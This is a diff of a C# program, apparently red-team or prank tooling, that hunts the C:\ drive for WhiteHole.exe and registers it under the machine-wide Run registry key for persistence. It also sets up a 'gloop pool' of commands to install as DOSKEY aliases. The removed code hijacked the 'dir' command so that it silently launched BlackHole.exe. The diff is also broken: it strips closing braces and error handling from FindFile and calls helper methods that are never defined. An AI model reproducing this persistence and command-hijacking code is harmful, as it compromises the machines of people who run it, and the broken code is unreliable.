@@ -2,59 +2,83 @@
 using System.IO;
 using System.Diagnostics;
 using System.Threading;
+using System.Collections.Generic;
+using System.Linq;
+using Microsoft.Win32;
+
 namespace RuleChange
 {
     class RuleChange
-
     {
+        // File to persist the pool of commands.
+        static string poolFile = "gloopPool.txt";
+
         static void Main(string[] args)
         {
-            //Test
-            //Find startup file and set reg key to startup
+            // If arguments are provided, handle the add command.
+            if (args.Length > 0 && args[0].Equals("add", StringComparison.OrdinalIgnoreCase))
+            {
+                if (args.Length < 2)
+                {
+                    Console.WriteLine("Usage: RuleChange add <command>");
+                    return;
+                }
+                string commandToAdd = args[1];
+                AddCommandToPool(commandToAdd);
+                Console.WriteLine($"Added '{commandToAdd}' to the gloop pool.");
+                return;
+            }
+
+            // Default routine: set startup registry key and configure aliases.
             string startDir = @"C:\";
             string targetFile = "WhiteHole.exe";
             string filePath = FindFile(targetFile, startDir);
-            makeJawn(filePath);
+            if (!string.IsNullOrEmpty(filePath))
+            {
+                makeJawn(filePath);
+            }
+            else
+            {
+                Console.WriteLine($"{targetFile} not found.");
+            }
 
-            //Change Dir to Dir && GLOOP && blackhole
-            SetDirAlias();
-
-
+            // Set DOSKEY aliases for all commands in the gloop pool.
+            SetAliasesForPool();
         }
 
-
         /// <summary>
-        /// Creates a reistry key to run an executable at the specified location
+        /// Creates a registry key to run an executable at startup.
         /// </summary>
         /// <param name="location">File path to the executable</param>
-        /// <returns>True for successful creation, false for unsuccessful creation</returns>
+        /// <returns>True for success, false otherwise</returns>
         static bool makeJawn(string location)
         {
             try
             {
-                using (var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
+                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                 {
                     if (key == null)
                         return false;
 
-                    // "MyApp" is an arbitrary name for the registry entry.
+                    // "X3" is an arbitrary name for the registry entry.
                     key.SetValue("X3", location);
                 }
                 return true;
             }
             catch (Exception ex)
             {
-                // Log or handle exception as needed.
+                // Handle exception as needed.
                 return false;
             }
         }
 
-
+        /// <summary>
+        /// Recursively searches for a file starting from the specified directory.
+        /// </summary>
         public static string FindFile(string fileName, string startDirectory)
         {
             try
             {
-                // Check all files in the current directory.
                 foreach (string file in Directory.EnumerateFiles(startDirectory))
                 {
                     if (Path.GetFileName(file).Equals(fileName, StringComparison.OrdinalIgnoreCase))
@@ -63,7 +87,6 @@ namespace RuleChange
                     }
                 }
 
-                // Recursively search in subdirectories.
                 foreach (string directory in Directory.EnumerateDirectories(startDirectory))
                 {
                     try
@@ -72,39 +95,5 @@ namespace RuleChange
                         if (result != null)
                         {
                             return result;
-                        }
-                    }
-                    catch (UnauthorizedAccessException)
-                    {
-                        // Skip directories that cannot be accessed.
-                        continue;
-                    }
-                }
-            }
-            catch (UnauthorizedAccessException)
-            {
-                // Skip directories that cannot be accessed.
-            }
 
-            // Return null if the file wasn't found in the current directory or any subdirectories.
-            return null;
-        }
 
-        public static void SetDirAlias()
-        {
-            string blackPath = FindFile("BlackHole.exe", @"C:\")
-            var startInfo = new System.Diagnostics.ProcessStartInfo
-            {
-                FileName = "cmd.exe",
-                Arguments = ("/c doskey dir=dir $* ^&^& echo Gloop! ^&^& " + blackPath),
-                CreateNoWindow = true,
-                UseShellExecute = false
-            };
-            using (var process = System.Diagnostics.Process.Start(startInfo))
-            {
-                process.WaitForExit();
-            }
-        }
-
-    }
-}
